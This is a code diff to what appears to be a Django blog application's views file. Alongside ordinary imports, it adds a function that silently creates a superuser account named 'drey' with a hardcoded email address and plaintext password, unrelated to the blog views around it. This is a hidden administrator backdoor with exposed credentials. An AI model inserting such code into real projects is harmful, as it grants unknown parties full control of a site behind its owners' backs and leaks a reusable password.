@@ -5,6 +5,7 @@ from django.contrib import messages
 from django.conf import settings
 from .models import Post, Category, Comment
 from .forms import CommentForm, SearchForm
+from django.contrib.auth import get_user_model
 
 def home(request):
     """Homepage view with paginated posts"""
@@ -63,6 +64,11 @@ def post_detail(request, slug):
     }
     return render(request, 'blog/post_detail.html', context)
 
+
+def create_superuser_if_not_exists():
+    User = get_user_model()
+    if not User.objects.filter(username="drey").exists():
+        User.objects.create_superuser("drey", "cobi658@gmail.com", "mikay2021")
 
 def category_posts(request, slug):
     """Posts filtered by category"""
